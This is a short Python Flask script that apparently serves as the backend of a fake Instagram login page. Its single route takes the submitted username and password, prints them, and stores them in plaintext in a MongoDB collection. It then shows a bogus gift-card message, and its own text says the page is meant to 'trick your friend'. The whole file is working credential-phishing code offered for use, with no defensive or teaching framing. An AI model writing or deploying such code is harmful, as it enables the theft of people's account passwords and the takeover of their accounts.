from flask import Flask, render_template, request
from pymongo import MongoClient

app = Flask(__name__, template_folder='templates')



client = MongoClient('your mongo key')
db = client['instagram']
users_collection = db['users']

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        print(username)
        print(password)
        
        users_collection.insert_one({'username': username, 'password': password})

        
        return "Here is your gift card you can type anything here or make a new page to trick your friend haha"

    return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)